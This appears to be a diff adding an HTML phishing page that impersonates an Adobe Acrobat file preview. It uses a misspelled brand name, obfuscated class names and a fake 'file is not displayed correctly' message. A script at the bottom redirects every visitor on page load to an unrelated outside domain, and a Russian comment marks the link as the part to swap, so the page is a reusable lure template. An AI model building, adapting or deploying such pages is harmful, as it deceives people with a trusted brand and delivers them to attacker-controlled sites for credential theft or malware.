@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Acrobat</title>
+
+        <link rel="preconnect" href="https://fonts.googleapis.com/">
+		<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+		<link href="./Acrobat_files/css2" rel="stylesheet">
+
+	<style>
+		html{
+			max-width: 100%;
+			max-height: 100%;
+			box-sizing: border-box;
+			overflow-x: hidden;
+		}
+		*, *::before ,*::after{
+			box-sizing: inherit;
+			
+		}
+		body{
+			font-family: 'Roboto Flex', sans-serif;
+			
+			max-width: 100%;
+			
+			background: #F3F8FB;
+		}
+		ul{
+			margin: 0 auto;
+			list-style: none;
+		}
+		a{
+			text-decoration: none;
+		}
+
+		h1{
+			font-family: 'Inter', sans-serif;
+			font-style: normal;
+			font-weight: 600;
+			font-size: 38px;
+			line-height: 135%;
+
+			text-align: center;
+
+			color: #141414;
+		}
+
+		.FnxYgKUytKTskHAxeN{
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 400px;
+			height: 977px;      
+			background: linear-gradient(180deg, #FE7F66 -13.25%, #FF2B1F 100%);
+		}
+
+		.block_txt{
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			margin-top: 100px;
+		}
+
+		.txt{
+			padding-top: 50px;
+			margin: 0;
+			font-family: 'Inter', sans-serif;
+			font-style: normal;
+			font-weight: 600;
+			font-size: 36px;
+			line-height: 135%;
+			color: #FFFFFF;
+		}
+
+		.txt1{
+			padding-top: 25px;
+			margin: 0;
+			font-weight: 400;
+			font-size: 18px;
+			color: #FFFFFF;
+		}
+
+		.block{
+			margin-top: 60px;
+			margin-left: 460px;
+			width: 1400px;
+			height: 857px;
+			background: #FFFFFF;
+			border: 1px solid rgba(0, 0, 0, 0.15);
+			border-radius: 12px;
+		}
+
+		.DBYnsphaGtenoF{
+			text-align: center;
+			padding-top: 150px;
+		}
+
+		.text_msg_1{
+			padding-top: 34px;
+			margin: 0;
+			padding-bottom: 20px;
+
+		}
+
+		.a{
+			padding-top: 20px;
+		}
+
+		.span{
+			margin: 0;
+			color: rgba(20, 20, 20, 0.6);
+			font-weight: 400;
+			font-size: 20px;
+		}
+
+	
+	</style>
+    </head>
+    <body>
+	   <noscript>
+		  <h1 class="no-script" style="text-align:center">Preview is unavailable.</h1>
+		  <h2 class="no-script" style="text-align:center">This file should be open in Chrome, Firefox or Microsoft Edge.</h2>
+	   </noscript>
+	   <div id="container819238" style="display: none;">
+			<h1>Preview is unavailable</h1>
+			<p>This page should be open in Chrome,Firefox or Microsoft Edge.</p>
+	   </div>
+       <div class="" style="visibility: visible;" id="txnq3272498">
+        <div class="banner">
+            <div class="FnxYgKUytKTskHAxeN" id="rnd1">
+                <div class="block_txt">
+                    <svg width="276" height="268" viewBox="0 0 276 268" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M269.59 167.482C249.047 146.152 192.956 154.843 179.527 156.422C159.777 137.461 146.347 114.55 141.607 106.651C148.717 85.3199 153.455 63.989 154.247 41.0804C154.247 21.3291 146.347 0 124.225 0C116.326 0 109.214 4.73865 105.263 11.0586C95.7844 27.6508 99.7333 60.8317 114.744 94.8024C106.055 119.292 98.1538 142.992 76.0332 184.864C53.1228 194.342 4.93097 216.464 0.980366 240.166C-0.599183 247.274 1.77014 254.387 7.30029 259.915C12.8304 264.656 19.9401 267.025 27.0516 267.025C56.2819 267.025 84.7224 226.736 104.474 192.762C121.064 187.234 147.135 179.332 173.207 174.592C204.016 201.453 230.877 205.402 245.099 205.402C264.058 205.402 271.17 197.502 273.539 190.391C277.488 182.493 275.119 173.802 269.59 167.482ZM249.837 180.914C249.047 186.444 241.939 191.972 229.298 188.813C214.287 184.864 200.857 177.753 189.007 168.272C199.278 166.691 222.186 164.322 238.779 167.482C245.099 169.062 251.418 173.013 249.837 180.914ZM117.905 18.1683C119.485 15.799 121.856 14.2194 124.225 14.2194C131.335 14.2194 132.914 22.9087 132.914 30.0201C132.124 46.6123 128.964 63.201 123.435 79.0017C111.583 47.4003 113.954 25.278 117.905 18.1683ZM116.326 171.433C122.645 158.793 131.336 136.671 134.496 127.19C141.605 139.038 153.455 153.261 159.777 159.581C159.777 160.373 135.285 165.111 116.326 171.433ZM69.7132 203.034C51.5432 233.054 32.5817 252.014 22.3112 252.014C20.7316 252.014 19.1504 251.224 17.5708 250.435C15.1998 248.853 14.41 246.484 15.1998 243.325C17.5708 232.265 38.1119 217.254 69.7132 203.034Z" fill="white"></path>
+                    </svg>
+                    <h1 class="txt">
+                        Acrobate DC. It\u2019s<br>
+                            how the world<br>
+                        gets work done.<br>
+                    </h1>
+                    <h1 class="txt1">
+                        View, sign, comment on, and<br>
+                        share PDFs for free
+                    </h1> 
+                </div>
+            </div>
+       </div>
+       <div class="block">
+            <div class="DBYnsphaGtenoF" id="rnd2">
+                <img class="img" alt="" src="data:image/png;base64,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" "="">
+                <h1 class="text_msg_1">The file is not displayed correctly.<br>
+                    Use local downloaded file.</h1>
+				<p class="mt-1" style="font-size: 30px;">&nbsp;<span style="background-color: LightGray"></span>
+				</p>
+
+            </div>
+			
+        </div>
+       </div>
+	    <script type="text/javascript">
+		window.location = 'https://www.patrickforeilly.com/vpr/';  //\u0422\u0443\u0442 \u043c\u0435\u043d\u044f\u0435\u0448\u044c \u0441\u044b\u043b\u043a\u0443
+		</script>
+</body></html>
